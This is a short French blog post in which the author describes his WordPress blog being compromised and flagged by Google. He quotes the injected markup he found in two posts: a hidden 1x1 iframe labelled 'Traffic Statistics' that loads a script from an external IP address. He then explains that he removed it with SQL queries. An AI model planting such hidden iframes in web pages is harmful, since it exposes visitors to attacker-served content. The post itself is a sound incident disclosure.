---
id: 515
title: 'Ce blog s&rsquo;est fait kacker'
date: 2008-05-12T23:41:08+00:00
author: Régis
layout: post
guid: http://regis.decamps.info/blog/2008/05/ce-blog-sest-fait-kacker/
permalink: /2008/05/ce-blog-sest-fait-kacker/
tmac_last_id:
  - ""
dsq_thread_id:
  - "564520470"
categories:
  - Général
  - Informatique
tags:
  - Hacking
  - Sécurité
---
Attention, mon blog a été hacké.

Google indiquait que mon blog était &lsquo;potentiellement dangereux&rsquo;. J&rsquo;ai d&rsquo;abord cru qu&rsquo;ils avaient fumé ; mais en fait non. 

Par exemple, quelques posts contenaient
  
`<br />
<!-- Traffic Statistics --> <iframe src=http://xx.155.8.157/iframe/wp-stats.php width=1 height=1 frameborder=0></iframe> <!-- End Traffic Statistics --><br />
` 

WordPress a connu un certain nombre de failles de sécurité, et j&rsquo;ai un peu de mal à suivre les mises à jour. 

J&rsquo;ai fait le ménage à coup de requêtes SQL. Deux articles étaient concernés:

  * <http://regis.decamps.info/blog/2008/04/liso-approve-loffice-open-xml/>
  * <http://regis.decamps.info/blog/2007/10/boutique-ferrari/>